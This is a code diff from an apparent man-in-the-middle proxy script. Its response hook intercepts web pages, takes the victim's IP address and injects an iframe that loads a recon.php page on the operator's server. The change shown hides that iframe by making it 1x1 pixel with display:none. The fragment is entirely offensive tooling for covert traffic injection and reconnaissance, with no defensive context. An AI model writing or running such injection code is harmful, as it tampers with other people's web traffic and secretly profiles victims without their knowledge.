@@ -19,7 +19,7 @@ def response(context, flow):
 		client_conn = client_conn.split(" ")[1]
 		client_conn = client_conn.split(":")[0]
 
-		inject_recon = "\n<iframe src='http://"+context.server+"/recon/recon.php?client_conn="+client_conn+"'></iframe>\n"
+		inject_recon = "\n<iframe src='http://"+context.server+"/recon/recon.php?client_conn="+client_conn+"' height='1' width='1' style='display:none'></iframe>\n"
 
 		flow.response.content = flow.response.content.replace("</body>", inject_recon + "</body>")
 		flow.response.content = flow.response.content.replace("client_conn_xxx_xxx_xxx_xxx", client_conn)
